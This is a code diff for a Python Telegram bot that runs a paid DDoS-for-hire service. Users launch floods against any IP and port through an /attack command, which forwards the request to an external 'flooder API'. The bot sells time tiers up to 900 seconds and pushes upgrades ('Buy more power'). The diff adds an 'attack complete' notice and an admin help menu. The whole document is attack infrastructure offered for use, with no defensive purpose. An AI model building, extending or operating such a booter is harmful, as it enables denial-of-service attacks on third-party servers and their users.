@@ -25,11 +25,11 @@ CONTACT = "@MODSERVEROFC"
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-API_URL = os.getenv("API_URL")          # Your flooder API (laptop via tunnel)
+API_URL = os.getenv("API_URL")
 API_KEY = os.getenv("API_KEY")
 ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]
-ACCESS_GROUP_USERNAME = "MODSERVEROFC"  # Group username without @
-MAX_CONCURRENT_ATTACKS = 4              # Global limit enforced by bot
+ACCESS_GROUP_USERNAME = "MODSERVEROFC"
+MAX_CONCURRENT_ATTACKS = 4
 
 BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
 MIN_PORT, MAX_PORT = 1, 65535
@@ -53,11 +53,6 @@ def make_aware(dt):
 
 def get_current_time():
     return datetime.now(timezone.utc)
-
-def escape_markdown(text: str) -> str:
-    if not text: return ""
-    special_chars = r'_*[]()~`>#+-=|{}.!'
-    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))
 
 def is_port_blocked(port: int) -> bool:
     return port in BLOCKED_PORTS
@@ -145,7 +140,7 @@ class Database:
 
 db = Database()
 
-# ---------- Access Control: @MODSERVEROFC ----------
+# ---------- Access Control ----------
 async def is_member_of_access_group(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
     try:
         chat = await context.bot.get_chat(f"@{ACCESS_GROUP_USERNAME}")
@@ -164,7 +159,7 @@ async def require_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return False
     return True
 
-# ---------- API Functions (call your flooder) ----------
+# ---------- API Functions ----------
 def launch_attack(ip: str, port: int, duration: int) -> Dict:
     try:
         resp = requests.post(
@@ -195,7 +190,7 @@ async def is_user_approved(user_id: int) -> bool:
     if exp and make_aware(exp) < get_current_time(): return False
     return True
 
-# ---------- Admin Command Decorator ----------
+# ---------- Admin Decorator ----------
 def admin_required(func):
     @wraps(func)
     async def wrapper(update, context, *args, **kwargs):
@@ -262,7 +257,7 @@ async def running_command(update, context):
 async def stats_command(update, context):
     total_attacks = db.attacks.count_documents({})
     users = len(db.get_all_users())
-    await update.message.reply_text(f"📊 Ghost X Official Stats\nUsers: {users}\nTotal attacks logged: {total_attacks}")
+    await update.message.reply_text(f"📊 {BOT_NAME} Stats\nUsers: {users}\nTotal attacks logged: {total_attacks}")
 
 @admin_required
 async def blockedports_admin(update, context):
@@ -337,7 +332,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.log_attack(user_id, ip, port, duration, "success", str(resp))
         active_info = get_active_attacks()
         usage = f"📊 Server Load: {active_info.get('count',0)}/{MAX_CONCURRENT_ATTACKS} attacks running"
-        await msg.edit_text(f"✅ Attack sent!\n{ip}:{port} for {duration}s\n{usage}\n\n💸 Buy more power: {CONTACT}")
+        await msg.edit_text(f"✅ Attack launched!\n{ip}:{port} for {duration}s\n{usage}\n\n💸 Buy more power: {CONTACT}")
+        
+        # Schedule "Attack Complete" message after duration seconds
+        async def attack_complete():
+            await asyncio.sleep(duration)
+            await update.message.reply_text(f"✅ Attack complete! {ip}:{port} finished {duration}s flood.\n💸 DM {CONTACT} for more power.")
+        asyncio.create_task(attack_complete())
     else:
         db.log_attack(user_id, ip, port, duration, "failed", str(resp))
         await msg.edit_text(f"❌ Attack failed: {resp.get('error', 'Unknown')}\n\nContact {CONTACT} for support.")
@@ -386,21 +387,38 @@ async def mystats_command(update, context):
 async def blockedports_command(update, context):
     await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}\nAllowed: {MIN_PORT}-{MAX_PORT} except those.\n\n💸 DM {CONTACT} for custom unlocks.")
 
-async def help_command(update, context):
-    if not await require_access(update, context): return
-    msg = (f"🔥 {BOT_NAME} Help 🔥\n\n"
-           f"/attack IP PORT DURATION – Launch an attack\n"
-           f"/myattacks – Show running attacks\n"
-           f"/myinfo – Your account details\n"
-           f"/mystats – Attack history\n"
-           f"/blockedports – Blocked port list\n\n"
-           f"⭐ Tiers:\n"
-           f"• Free: 1-60s\n"
-           f"• Premium: 60-600s\n"
-           f"• VIP: 60-900s\n\n"
-           f"📡 Max concurrent: {MAX_CONCURRENT_ATTACKS}\n\n"
-           f"💸 Want to buy or upgrade? DM {CONTACT}")
-    await update.message.reply_text(msg)
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    is_admin = user_id in ADMIN_IDS
+    
+    # Always show user commands
+    msg = f"🔥 {BOT_NAME} Help 🔥\n\n"
+    msg += "📱 **User Commands:**\n"
+    msg += "/attack IP PORT DURATION – Launch an attack\n"
+    msg += "/myattacks – Show your active attacks\n"
+    msg += "/myinfo – Your account details\n"
+    msg += "/mystats – Attack history\n"
+    msg += "/blockedports – List blocked ports\n"
+    msg += "/start – Welcome message\n"
+    msg += "/help – This menu\n\n"
+    
+    # Only show admin commands if user is admin
+    if is_admin:
+        msg += "👑 **Admin Commands:**\n"
+        msg += "/approve `<userid>` `<days>` – Approve a user\n"
+        msg += "/disapprove `<userid>` – Revoke access\n"
+        msg += "/set_tier `<userid>` `<free|premium|vip>` – Change user tier\n"
+        msg += "/users – List all users\n"
+        msg += "/status – Check flooder API health\n"
+        msg += "/running – Show active attacks\n"
+        msg += "/stats – Bot statistics\n"
+        msg += "/blockedports – Show blocked ports (admin)\n\n"
+    
+    msg += f"⭐ **Tiers:**\n• Free: 1-60s\n• Premium: 60-600s\n• VIP: 60-900s\n\n"
+    msg += f"📡 Max concurrent: {MAX_CONCURRENT_ATTACKS}\n\n"
+    msg += f"💸 Want to buy or upgrade? DM {CONTACT}"
+    
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
 # ---------- Main ----------
 def main():
